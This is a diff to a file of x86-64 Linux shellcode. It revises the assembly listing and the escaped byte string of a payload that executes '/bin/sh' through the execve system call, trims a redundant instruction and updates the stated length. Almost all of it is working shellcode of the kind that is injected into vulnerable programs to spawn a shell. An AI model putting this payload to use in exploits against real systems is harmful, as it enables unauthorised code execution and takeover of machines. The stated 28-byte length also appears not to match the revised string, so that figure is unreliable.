@@ -30,7 +30,7 @@ Shell Code in String format :
 
 same code but with no bad chars "0x00"
 
-Length : 31 bytes
+Length : 28 bytes
 Inspired by: Andrew Bellini
 Code: 
 48 31 c0              |  xor    rax,rax
@@ -38,7 +38,6 @@ Code:
 48 b9 2f 2f 62 69 6e 	|  movabs rcx,0x68732f6e69622f2f
 2f 73 68 
 51                   	|  push   rcx
-48 31 c0             	|  xor    rax,rax
 b0 3b                	|  mov    al,0x3b
 48 89 e7             	|  mov    rdi,rsp
 48 31 d2             	|  xor    rdx,rdx
@@ -47,4 +46,4 @@ b0 3b                	|  mov    al,0x3b
 
 
 Shell Code in String format :
-"\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x51\x48\x31\xc0\xb0\x3b\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\x0f\x05"
+"\x48\x31\xC0\x50\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x51\xb0\x3b\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\x0f\x05"
